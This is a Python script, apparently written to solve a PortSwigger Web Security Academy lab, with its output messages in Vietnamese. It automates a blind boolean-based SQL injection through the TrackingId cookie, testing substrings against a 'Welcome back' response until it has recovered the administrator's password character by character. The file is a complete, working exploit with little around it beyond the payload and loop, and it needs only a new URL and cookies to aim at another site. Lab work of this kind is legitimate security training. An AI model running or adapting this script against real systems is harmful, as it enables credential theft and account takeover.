import requests
from termcolor import colored # 
alphanumeric = '0123456789abcdefghijklmnopqrstuvwxyz'

target = "https://0a5b00ae0381ef4a81a4e3e6007700f9.web-security-academy.net/"
sucess_indicator = "Welcome back"
password = ""
password_length = 20

print(colored("[i] trích xuất mật khẩu: ", "blue"))

for position in range(1, password_length + 1):
    found = False
    for char in alphanumeric:
        print(f"đang thử kí tự {char}")
        payload = f"' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}"
        
        headers = {
           
            "Cookie": f"TrackingId=S7ZJnmWxEBEFmZU7{payload}; session=u06T3yD3vGgSwjb74H7y3ACWvhOZtfNc"
        }
        
        response = requests.get(target, headers=headers)
        
        if sucess_indicator in response.text:
            password += char
            print(colored(f"[+] Tìm thấy ký tự ở vị trí {position}: {char}", "green"))
            found = True
            break 
    if not found:
        print(colored("[-] Không tìm thấy thêm ký tự nào. Kết thúc.", "red"))
        break

print(colored(f"\n[!] MK là : {password}", "yellow"))